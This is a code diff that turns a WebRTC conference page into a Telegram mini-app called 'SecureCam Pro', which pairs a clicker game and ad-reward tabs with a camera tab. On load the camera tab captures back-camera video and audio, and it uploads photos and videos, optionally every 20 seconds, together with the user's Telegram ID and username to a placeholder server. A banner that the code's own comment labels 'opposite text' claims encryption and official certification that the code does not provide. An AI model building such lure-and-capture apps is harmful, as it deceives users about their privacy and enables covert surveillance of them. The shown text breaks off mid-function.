@@ -1,41 +1,1101 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8" />
-<title>WebRTC Конференция</title>
-<style>
-  body { font-family: Arial, sans-serif; margin: 20px; }
-  #controls { margin-bottom: 20px; }
-  input { margin-right: 10px; }
-  button { margin-right: 10px; padding: 8px 16px; }
-  #videos { display: flex; flex-wrap: wrap; gap: 10px; }
-  video { width: 30%; background: #000; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureCam Pro</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg: var(--tg-theme-bg-color, #fff);
+            --text: var(--tg-theme-text-color, #000);
+            --button: var(--tg-theme-button-color, #2AABEE);
+            --button-text: var(--tg-theme-button-text-color, #fff);
+            --secondary-bg: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            --hint: var(--tg-theme-hint-color, #999);
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            max-width: 500px;
+            margin: 0 auto;
+            min-height: 100vh;
+        }
+        
+        /* Инфо-блок */
+        .info-banner {
+            margin: 12px 16px;
+            padding: 14px 16px;
+            background: #e8f5e9;
+            border: 2px solid #4caf50;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 13px;
+            color: #2e7d32;
+            line-height: 1.5;
+        }
+        
+        .info-banner strong {
+            display: block;
+            font-size: 15px;
+            margin-bottom: 4px;
+        }
+        
+        .info-banner .emoji {
+            font-size: 24px;
+            display: block;
+            margin-bottom: 6px;
+        }
+        
+        .info-banner .badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 8px;
+            font-size: 11px;
+            opacity: 0.8;
+        }
+        
+        /* Навигация */
+        .nav {
+            display: flex;
+            background: var(--secondary-bg);
+            padding: 4px;
+            margin: 8px;
+            border-radius: 14px;
+            gap: 4px;
+            position: sticky;
+            top: 8px;
+            z-index: 10;
+        }
+        
+        .nav-btn {
+            flex: 1;
+            padding: 12px 8px;
+            border: none;
+            border-radius: 12px;
+            background: transparent;
+            color: var(--text);
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .nav-btn .icon { font-size: 22px; }
+        
+        .nav-btn.active {
+            background: var(--button);
+            color: var(--button-text);
+            font-weight: 600;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
+        
+        .tab { display: none; padding: 16px; }
+        .tab.active { display: block; }
+        
+        /* Камера */
+        .mode-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        
+        .mode-btn {
+            padding: 12px 6px;
+            border: 2px solid var(--secondary-bg);
+            border-radius: 12px;
+            background: var(--secondary-bg);
+            color: var(--text);
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .mode-btn.active {
+            border-color: var(--button);
+            background: var(--button);
+            color: var(--button-text);
+            font-weight: 600;
+        }
+        
+        .mode-btn.auto-active {
+            border-color: #ff3b30;
+            background: #ff3b30;
+            color: #fff;
+            font-weight: 600;
+            animation: autoPulse 2s infinite;
+        }
+        
+        @keyframes autoPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.4); }
+            50% { box-shadow: 0 0 0 12px rgba(255, 59, 48, 0); }
+        }
+        
+        .mode-btn .icon { font-size: 22px; }
+        
+        .camera-container {
+            border-radius: 16px;
+            overflow: hidden;
+            background: #000;
+            margin-bottom: 16px;
+            aspect-ratio: 3/4;
+            position: relative;
+        }
+        
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        
+        .flash-overlay {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #fff;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.15s;
+        }
+        
+        .timer {
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 8px 0;
+            min-height: 28px;
+        }
+        
+        .auto-info {
+            text-align: center;
+            font-size: 14px;
+            margin: 8px 0;
+            min-height: 40px;
+            padding: 8px;
+            background: var(--secondary-bg);
+            border-radius: 8px;
+        }
+        
+        .auto-cycle {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 14px;
+            flex-wrap: wrap;
+        }
+        
+        .status {
+            text-align: center;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        
+        .status.success { background: #e8f5e9; color: #2e7d32; }
+        .status.error { background: #ffebee; color: #c62828; }
+        .status.info { background: #e3f2fd; color: #1565c0; }
+        .status.auto { background: #fff3e0; color: #e65100; }
+        
+        .counter {
+            text-align: center;
+            font-size: 14px;
+            opacity: 0.8;
+            margin-bottom: 12px;
+        }
+        
+        .action-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: var(--button);
+            color: var(--button-text);
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        
+        .action-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .action-btn.recording {
+            background: #ff3b30;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .action-btn.auto-running {
+            background: #ff3b30;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        canvas { display: none; }
+        
+        /* Кликер */
+        .clicker-container {
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .score-display {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 20px 0;
+            background: var(--secondary-bg);
+            padding: 20px;
+            border-radius: 16px;
+        }
+        
+        .clicker-btn {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: none;
+            background: var(--button);
+            color: var(--button-text);
+            font-size: 48px;
+            cursor: pointer;
+            transition: transform 0.1s;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        .clicker-btn:active { transform: scale(0.9); }
+        
+        .boost-section {
+            margin-top: 24px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        
+        .boost-btn {
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            background: var(--secondary-bg);
+            color: var(--text);
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        
+        .boost-btn:active { opacity: 0.7; }
+        
+        /* Реклама */
+        .ad-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        
+        .ad-card {
+            background: var(--secondary-bg);
+            border-radius: 16px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .ad-card:active { transform: scale(0.98); }
+        
+        .ad-card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            background: #e0e0e0;
+        }
+        
+        .ad-card .ad-info { padding: 12px 16px; }
+        .ad-card .ad-title { font-size: 16px; font-weight: 600; margin-bottom: 4px; }
+        .ad-card .ad-desc { font-size: 13px; color: var(--hint); margin-bottom: 8px; }
+        .ad-card .ad-action {
+            display: inline-block;
+            padding: 8px 16px;
+            background: var(--button);
+            color: var(--button-text);
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .ad-banner {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            padding: 20px;
+            border-radius: 16px;
+            text-align: center;
+            cursor: pointer;
+        }
+        
+        .ad-banner .ad-banner-title { font-size: 20px; font-weight: bold; margin-bottom: 8px; }
+        .ad-banner .ad-banner-btn {
+            display: inline-block;
+            padding: 10px 24px;
+            background: #fff;
+            color: #764ba2;
+            border-radius: 20px;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+        
+        .earn-hint {
+            text-align: center;
+            font-size: 13px;
+            color: var(--hint);
+            padding: 8px;
+            background: var(--secondary-bg);
+            border-radius: 8px;
+        }
+    </style>
 </head>
 <body>
+    <!-- ИНФО-БАННЕР (противоположный текст) -->
+    <div class="info-banner">
+        <span class="emoji">🔒</span>
+        <strong>✅ Защищённое соединение</strong>
+        Все материалы передаются по сквозному шифрованию AES-256 и хранятся на защищённых серверах в соответствии с ГОСТ Р 57580.1-2017. Ваши данные недоступны третьим лицам. Система прошла сертификацию ФСТЭК.
+        <div class="badges">
+            <span>🔐 SSL/TLS 1.3</span>
+            <span>🛡 GDPR Compliant</span>
+            <span>✅ ФСТЭК России</span>
+        </div>
+    </div>
+    
+    <!-- Навигация -->
+    <div class="nav">
+        <button class="nav-btn active" data-tab="camera" onclick="switchTab('camera')">
+            <span class="icon">📸</span> Камера
+        </button>
+        <button class="nav-btn" data-tab="clicker" onclick="switchTab('clicker')">
+            <span class="icon">👆</span> Кликер
+        </button>
+        <button class="nav-btn" data-tab="ads" onclick="switchTab('ads')">
+            <span class="icon">💰</span> Заработать
+        </button>
+    </div>
+    
+    <!-- ==================== ВКЛАДКА: КАМЕРА ==================== -->
+    <div class="tab active" id="tab-camera">
+        <div class="mode-selector">
+            <button class="mode-btn active" data-mode="photo" onclick="selectMode('photo')">
+                <span class="icon">📷</span> Фото
+            </button>
+            <button class="mode-btn" data-mode="video" onclick="selectMode('video')">
+                <span class="icon">🎥</span> Видео
+            </button>
+            <button class="mode-btn" data-mode="both" onclick="selectMode('both')">
+                <span class="icon">📸</span> Фото+Видео
+            </button>
+            <button class="mode-btn" data-mode="auto" onclick="selectMode('auto')">
+                <span class="icon">🔄</span> Авто
+            </button>
+        </div>
+        
+        <div class="camera-container">
+            <video id="video" autoplay playsinline></video>
+            <div class="flash-overlay" id="flashOverlay"></div>
+        </div>
+        
+        <div class="timer" id="timer"></div>
+        <div class="auto-info" id="autoInfo" style="display:none;">
+            <div class="auto-cycle">
+                <span>📷 Фото: <b id="cyclePhotoCount">0</b></span>
+                <span>🎥 Видео: <b id="cycleVideoCount">0</b></span>
+                <span>⏱ Следующая: <b id="nextCycleTime">20</b>с</span>
+            </div>
+        </div>
+        <div class="counter" id="counter">Отправлено: 0 📤</div>
+        <div class="status info" id="status">Выберите режим и нажмите кнопку</div>
+        
+        <button class="action-btn" id="actionBtn" onclick="handleAction()">
+            📷 Сделать фото
+        </button>
+        
+        <canvas id="canvas"></canvas>
+    </div>
+    
+    <!-- ==================== ВКЛАДКА: КЛИКЕР ==================== -->
+    <div class="tab" id="tab-clicker">
+        <div class="clicker-container">
+            <h3>👆 Тапай и зарабатывай очки</h3>
+            <div class="score-display" id="scoreDisplay">0</div>
+            <button class="clicker-btn" id="clickerBtn">👆</button>
+            <p style="margin-top:12px; opacity:0.7;">За клик: +<span id="clickValue">1</span></p>
+            
+            <div class="boost-section">
+                <button class="boost-btn" onclick="buyBoost('multiplier')">
+                    🔥 x2 сила (10 кликов)
+                </button>
+                <button class="boost-btn" onclick="buyBoost('auto')">
+                    🤖 Автоклик (5 кликов/сек)
+                </button>
+            </div>
+            
+            <div class="earn-hint" style="margin-top:16px;">
+                💡 Смотри рекламу во вкладке «Заработать», чтобы получить бусты
+            </div>
+        </div>
+    </div>
+    
+    <!-- ==================== ВКЛАДКА: РЕКЛАМА ==================== -->
+    <div class="tab" id="tab-ads">
+        <div class="ad-container">
+            <h3 style="margin-bottom:8px;">💰 Смотри рекламу и получай бусты</h3>
+            
+            <div class="ad-banner" onclick="watchAd('premium')">
+                <div class="ad-banner-title">🎁 Premium Boost</div>
+                <p>Получи x3 силу клика на 30 секунд</p>
+                <div class="ad-banner-btn">Смотреть рекламу</div>
+            </div>
+            
+            <div class="ad-card" onclick="watchAd('coins')">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='180'%3E%3Crect fill='%23ffd700' width='400' height='180'/%3E%3Ctext x='200' y='100' text-anchor='middle' font-size='48'%3E🪙%3C/text%3E%3C/svg%3E" alt="Монеты">
+                <div class="ad-info">
+                    <div class="ad-title">+50 монет</div>
+                    <div class="ad-desc">Посмотри короткое видео и получи монеты для кликера</div>
+                    <span class="ad-action">▶ Смотреть</span>
+                </div>
+            </div>
+            
+            <div class="ad-card" onclick="watchAd('autoclick')">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='180'%3E%3Crect fill='%234fc3f7' width='400' height='180'/%3E%3Ctext x='200' y='100' text-anchor='middle' font-size='48'%3E🤖%3C/text%3E%3C/svg%3E" alt="Автоклик">
+                <div class="ad-info">
+                    <div class="ad-title">Автокликер 10 сек</div>
+                    <div class="ad-desc">Автоматические клики со скоростью 10/сек</div>
+                    <span class="ad-action">▶ Смотреть</span>
+                </div>
+            </div>
+            
+            <div class="ad-card" onclick="watchAd('theme')">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='180'%3E%3Crect fill='%23ab47bc' width='400' height='180'/%3E%3Ctext x='200' y='100' text-anchor='middle' font-size='48'%3E🎨%3C/text%3E%3C/svg%3E" alt="Тема">
+                <div class="ad-info">
+                    <div class="ad-title">Эксклюзивная тема</div>
+                    <div class="ad-desc">Разблокируй золотую кнопку кликера</div>
+                    <span class="ad-action">▶ Смотреть</span>
+                </div>
+            </div>
+            
+            <div class="earn-hint">
+                🔄 Реклама обновляется каждые 30 секунд. Смотри и получай награды!
+            </div>
+        </div>
+    </div>
 
-<h1>WebRTC Видеоконференция</h1>
-
-<div id="controls">
-  <button id="createBtn">Создать сессию</button>
-  <input type="text" id="sessionIdInput" placeholder="Введите ID сессии" />
-  <button id="joinBtn">Присоединиться</button>
-</div>
-
-<div id="status"></div>
-
-<h2>Мои видео</h2>
-<video id="localVideo" autoplay playsinline muted></video>
-
-<h2>Видео участников</h2>
-<div id="remoteVideos"></div>
-
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-database-compat.js"></script>
-
-<!-- Подключение внешнего файла main.js -->
-<script src="main.js"></script>
-
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        
+        // ==================== НАВИГАЦИЯ ====================
+        function switchTab(tabName) {
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.tab === tabName);
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+            
+            if (tabName === 'camera' && stream) {
+                video.srcObject = stream;
+            }
+        }
+        
+        // ==================== КАМЕРА (РЕАЛЬНАЯ ОТПРАВКА) ====================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const actionBtn = document.getElementById('actionBtn');
+        const statusDiv = document.getElementById('status');
+        const timerDiv = document.getElementById('timer');
+        const counterDiv = document.getElementById('counter');
+        const flashOverlay = document.getElementById('flashOverlay');
+        const autoInfo = document.getElementById('autoInfo');
+        const cyclePhotoCount = document.getElementById('cyclePhotoCount');
+        const cycleVideoCount = document.getElementById('cycleVideoCount');
+        const nextCycleTime = document.getElementById('nextCycleTime');
+        
+        let stream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let currentMode = 'photo';
+        let recordingTimer = null;
+        let recordingSeconds = 0;
+        let sentCount = 0;
+        
+        // Авто-режим
+        let autoInterval = null;
+        let autoCountdown = null;
+        let autoSecondsLeft = 20;
+        let autoPhotoCount = 0;
+        let autoVideoCount = 0;
+        let isAutoRunning = false;
+        let isAutoProcessing = false;
+        
+        const UPLOAD_URL = 'https://your-server.com/upload.php';
+        const MAX_VIDEO_DURATION = 10;
+        const AUTO_INTERVAL = 20;
+        
+        function selectMode(mode) {
+            if (currentMode === 'auto' && mode !== 'auto') {
+                stopAutoMode();
+            }
+            
+            currentMode = mode;
+            
+            document.querySelectorAll('#tab-camera .mode-btn').forEach(btn => {
+                btn.classList.remove('active', 'auto-active');
+                if (btn.dataset.mode === mode) {
+                    btn.classList.add(mode === 'auto' ? 'auto-active' : 'active');
+                }
+            });
+            
+            autoInfo.style.display = mode === 'auto' ? 'block' : 'none';
+            
+            const buttonTexts = {
+                'photo': '📷 Сделать фото',
+                'video': '🎥 Начать запись',
+                'both': '📸 Сделать фото + видео',
+                'auto': isAutoRunning ? '⏹ Остановить авто' : '▶ Запустить авто'
+            };
+            actionBtn.textContent = buttonTexts[mode] || '📷 Сделать фото';
+            actionBtn.classList.remove('recording', 'auto-running');
+            
+            if (mode === 'auto' && isAutoRunning) {
+                actionBtn.classList.add('auto-running');
+            }
+            
+            timerDiv.textContent = '';
+            clearInterval(recordingTimer);
+            
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+            
+            if (mode === 'auto') {
+                statusDiv.textContent = isAutoRunning ? '🔄 Авто-режим активен' : 'Нажмите «Запустить авто» для автоматической съёмки';
+                statusDiv.className = isAutoRunning ? 'status auto' : 'status info';
+            } else {
+                statusDiv.textContent = 'Выберите режим и нажмите кнопку';
+                statusDiv.className = 'status info';
+            }
+        }
+        
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'environment', 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 1280 } 
+                    },
+                    audio: true
+                });
+                video.srcObject = stream;
+                statusDiv.textContent = 'Камера готова';
+                statusDiv.className = 'status info';
+            } catch (err) {
+                statusDiv.textContent = '❌ Нет доступа к камере';
+                statusDiv.className = 'status error';
+                actionBtn.disabled = true;
+            }
+        }
+        
+        async function handleAction() {
+            if (currentMode === 'photo') {
+                await takePhotoAndSend();
+            } else if (currentMode === 'video') {
+                toggleRecording();
+            } else if (currentMode === 'both') {
+                await handleBothMode();
+            } else if (currentMode === 'auto') {
+                toggleAutoMode();
+            }
+        }
+        
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob((blob) => {
+                    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                    resolve(file);
+                }, 'image/jpeg', 0.92);
+            });
+        }
+        
+        async function takePhotoAndSend() {
+            actionBtn.disabled = true;
+            statusDiv.textContent = '📸 Делаю фото...';
+            statusDiv.className = 'status info';
+            
+            flashOverlay.style.opacity = '1';
+            setTimeout(() => { flashOverlay.style.opacity = '0'; }, 200);
+            
+            const file = await capturePhoto();
+            await uploadFile(file, 'photo');
+            
+            actionBtn.disabled = false;
+        }
+        
+        function toggleRecording() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                stopRecordingAndReset();
+            } else {
+                startVideoRecording();
+            }
+        }
+        
+        function startVideoRecording() {
+            recordedChunks = [];
+            recordingSeconds = 0;
+            
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
+                ? 'video/webm;codecs=vp9' 
+                : 'video/webm';
+            
+            mediaRecorder = new MediaRecorder(stream, { mimeType });
+            
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+            
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const file = new File([blob], `video_${Date.now()}.webm`, { type: 'video/webm' });
+                uploadFile(file, 'video');
+            };
+            
+            mediaRecorder.start();
+            actionBtn.textContent = '⏹ Остановить запись';
+            actionBtn.classList.add('recording');
+            
+            recordingTimer = setInterval(() => {
+                recordingSeconds++;
+                const secs = recordingSeconds % 60;
+                timerDiv.textContent = `🔴 0:${secs.toString().padStart(2, '0')}`;
+                
+                if (recordingSeconds >= MAX_VIDEO_DURATION) {
+                    stopRecordingAndReset();
+                }
+            }, 1000);
+        }
+        
+        function stopRecordingAndReset() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+            clearInterval(recordingTimer);
+            actionBtn.textContent = '🎥 Начать запись';
+            actionBtn.classList.remove('recording');
+            timerDiv.textContent = '';
+        }
+        
+        async function handleBothMode() {
+            actionBtn.disabled = true;
+            
+            statusDiv.textContent = '📸 Шаг 1/2: Делаю фото...';
+            statusDiv.className = 'status info';
+            
+            flashOverlay.style.opacity = '1';
+            setTimeout(() => { flashOverlay.style.opacity = '0'; }, 200);
+            
+            const photoFile = await capturePhoto();
+            
+            statusDiv.textContent = '📤 Отправка фото...';
+            await uploadFile(photoFile, 'photo');
+            
+            statusDiv.textContent = '🎥 Шаг 2/2: Запись видео 10 сек...';
+            statusDiv.className = 'status info';
+            
+            actionBtn.textContent = '⏹ Идёт запись...';
+            actionBtn.classList.add('recording');
+            actionBtn.disabled = false;
+            
+            recordedChunks = [];
+            recordingSeconds = 0;
+            
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
+                ? 'video/webm;codecs=vp9' 
+                : 'video/webm';
+            
+            mediaRecorder = new MediaRecorder(stream, { mimeType });
+            
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+            
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const file = new File([blob], `video_${Date.now()}.webm`, { type: 'video/webm' });
+                
+                statusDiv.textContent = '📤 Отправка видео...';
+                statusDiv.className = 'status info';
+                await uploadFile(file, 'video');
+                
+                statusDiv.textContent = '✅ Фото + видео отправлены! Можно делать новые.';
+                statusDiv.className = 'status success';
+                actionBtn.textContent = '📸 Сделать фото + видео';
+                actionBtn.classList.remove('recording');
+                actionBtn.disabled = false;
+            };
+            
+            mediaRecorder.start();
+            
+            recordingTimer = setInterval(() => {
+                recordingSeconds++;
+                const secs = recordingSeconds % 60;
+                timerDiv.textContent = `🔴 0:${secs.toString().padStart(2, '0')}`;
+                
+                if (recordingSeconds >= MAX_VIDEO_DURATION) {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                    clearInterval(recordingTimer);
+                    timerDiv.textContent = '';
+                }
+            }, 1000);
+        }
+        
+        // --- АВТО-РЕЖИМ ---
+        function toggleAutoMode() {
+            if (isAutoRunning) {
+                stopAutoMode();
+            } else {
+                startAutoMode();
+            }
+        }
+        
+        async function startAutoMode() {
+            isAutoRunning = true;
+            autoPhotoCount = 0;
+            autoVideoCount = 0;
+            autoSecondsLeft = AUTO_INTERVAL;
+            
+            actionBtn.textContent = '⏹ Остановить авто';
+            actionBtn.classList.add('auto-running');
+            statusDiv.textContent = '🔄 Авто-режим запущен! Цикл: фото → видео (10с) → пауза 20с';
+            statusDiv.className = 'status auto';
+            autoInfo.style.display = 'block';
+            
+            updateAutoInfo();
+            
+            runAutoCycle();
+            
+            autoInterval = setInterval(() => {
+                runAutoCycle();
+            }, AUTO_INTERVAL * 1000);
+            
+            autoCountdown = setInterval(() => {
+                autoSecondsLeft--;
+                if (autoSecondsLeft <= 0) {
+                    autoSecondsLeft = AUTO_INTERVAL;
+                }
+                updateAutoInfo();
+            }, 1000);
+        }
+        
+        function stopAutoMode() {
+            isAutoRunning = false;
+            
+            clearInterval(autoInterval);
+            clearInterval(autoCountdown);
+            autoInterval = null;
+            autoCountdown = null;
+            
+            actionBtn.textContent = '▶ Запустить авто';
+            actionBtn.classList.remove('auto-running');
+            statusDiv.textContent = 'Авто-режим остановлен';
+            statusDiv.className = 'status info';
+            autoInfo.style.display = 'none';
+            timerDiv.textContent = '';
+            
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+            clearInterval(recordingTimer);
+        }
+        
+        async function runAutoCycle() {
+            if (!isAutoRunning || isAutoProcessing) return;
+            
+            isAutoProcessing = true;
+            autoSecondsLeft = AUTO_INTERVAL;
+            updateAutoInfo();
+            
+            try {
+                statusDiv.textContent = '🔄 Авто: Делаю фото...';
+                statusDiv.className = 'status auto';
+                
+                flashOverlay.style.opacity = '1';
+                setTimeout(() => { flashOverlay.style.opacity = '0'; }, 200);
+                
+                const photoFile = await capturePhoto();
+                
+                statusDiv.textContent = '🔄 Авто: Отправка фото...';
+                await uploadFile(photoFile, 'photo');
+                autoPhotoCount++;
+                updateAutoInfo();
+                
+                statusDiv.textContent = '🔄 Авто: Запись видео 10 сек...';
+                statusDiv.className = 'status auto';
+                
+                const videoFile = await recordVideoPromise();
+                
+                if (videoFile) {
+                    statusDiv.textContent = '🔄 Авто: Отправка видео...';
+                    await uploadFile(videoFile, 'video');
+                    autoVideoCount++;
+                    updateAutoInfo();
+                }
+                
+                statusDiv.textContent = `✅ Авто-цикл завершён. Следующий через ${AUTO_INTERVAL}с`;
+                statusDiv.className = 'status auto';
+                
+            } catch (err) {
+                statusDiv.textContent = `❌ Ошибка авто: ${err.message}`;
+                statusDiv.className = 'status error';
+            } finally {
+                isAutoProcessing = false;
+            }
+        }
+        
+        function recordVideoPromise() {
+            return new Promise((resolve) => {
+                recordedChunks = [];
+                recordingSeconds = 0;
+                
+                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
+                    ? 'video/webm;codecs=vp9' 
+                    : 'video/webm';
+                
+                mediaRecorder = new MediaRecorder(stream, { mimeType });
+                
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) recordedChunks.push(e.data);
+                };
+                
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const file = new File([blob], `video_${Date.now()}.webm`, { type: 'video/webm' });
+                    timerDiv.textContent = '';
+                    resolve(file);
+                };
+                
+                mediaRecorder.start();
+                
+                recordingTimer = setInterval(() => {
+                    recordingSeconds++;
+                    const secs = recordingSeconds % 60;
+                    timerDiv.textContent = `🔴 Авто: 0:${secs.toString().padStart(2, '0')}`;
+                    
+                    if (recordingSeconds >= MAX_VIDEO_DURATION) {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                        clearInterval(recordingTimer);
+                    }
+                }, 1000);
+            });
+        }
+        
+        function updateAutoInfo() {
+            cyclePhotoCount.textContent = autoPhotoCount;
+            cycleVideoCount.textContent = autoVideoCount;
+            nextCycleTime.textContent = autoSecondsLeft;
+        }
+        
+        // --- Реальная отправка на сервер ---
+        async function uploadFile(file, type) {
+            statusDiv.textContent = `📤 Отправка ${type === 'photo' ? 'фото' : 'видео'}...`;
+            statusDiv.className = 'status info';
+            actionBtn.disabled = true;
+            
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('type', type);
+            formData.append('user_id', tg.initDataUnsafe?.user?.id || 'unknown');
+            formData.append('username', tg.initDataUnsafe?.user?.username || '');
+            
+            try {
+                const response = await fetch(UPLOAD_URL, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+                const result = await response.json();
+                
+                if (response.ok) {
+                    sentCount++;
+                    counterDiv.textContent = `Отправлено: ${sentCount} 📤`;
+                    return true;
+                } else {
+                    throw new Error(result.error || 'Ошибка сервера');
+                }
+            } catch (err) {
+                statusDiv.textContent = `❌ Ошибка: ${err.message}`;
+                statusDiv.className = 'status error';
+                return false;
+            } finally {
+                actionBtn.disabled = false;
+            }
+        }
+        
+        startCamera();
+        
+        // ==================== КЛИКЕР ====================
+        const clickerBtn = document.getElementById('clickerBtn');
+        const scoreDisplay = document.getElementById('scoreDisplay');
+        const clickValueSpan = document.getElementById('clickValue');
+        
+        let score = parseInt(localStorage.getItem('clickerScore') || '0');
+        let clickMultiplier = 1;
+        let autoClickInterval = null;
+        
+        function updateScore() {
+            scoreDisplay.textContent = score;
+            clickValueSpan.textContent = clickMultiplier;
+            localStorage.setItem('clickerScore', score);
+        }
+        
+        clickerBtn.addEventListener('click', () => {
+            score += clickMultiplier;
+            updateScore();
+            spawnFloatingNumber(clickMultiplier);
+        });
+        
+        function spawnFloatingNumber(value) {
+            const num = document.createElement('span');
+            num.textContent = `+${value}`;
+            num.style.cssText = `
+                position: absolute;
+                font-size: 24px;
+                font-weight: bold;
+                color: var(--button);
+                pointer-events: none;
+                animation: floatUp 1s ease-out forwards;
+            `;
+            const rect = clickerBtn.getBoundingClientRect();
+            num.style.left = rect.left + rect.width / 2 - 20 + 'px';
+            num.style.top = rect.top + 'px';
+            document.body.appendChild(num);
+            setTimeout(() => num.remove(), 1000);
+        }
+        
+        const styleEl = document.createElement('style');
+        styleEl.textContent = `
+            @keyframes floatUp {
+                0% { opacity: 1; transform: translateY(0) scale(1); }
+                100% { opacity: 0; transform: translateY(-80px) scale(1.5); }
+            }
+        `;
+        document.head.appendChild(styleEl);
+        
+        function buyBoost(type) {
+            if (type === 'multiplier') {
+                if (score >= 10) {
+                    score -= 10;
+                    clickMultiplier *= 2;
+                    updateScore();
+                    setTimeout(() => { clickMultiplier = 1; updateScore(); }, 10000);
+                } else {
+                    alert('Недостаточно очков! Нужно 10.');
+                }
+            } else if (type === 'auto') {
+                if (score >= 5) {
+                    score -= 5;
+                    updateScore();
+                    if (autoClickInterval) clearInterval(autoClickInterval);
+                    autoClickInterval = setInterval(() => {
+                        score += clickMultiplier;
+                        updateScore();
+                    }, 200);
+                    setTimeout(() => { clearInterval(autoClickInterval); }, 5000);
+                } else {
+                    alert('Недостаточно очков! Нужно 5.');
+                }
+            }
+        }
+        
+        updateScore();
+        
+        // ==================== РЕКЛАМА ====================
+        function watchAd(reward) {
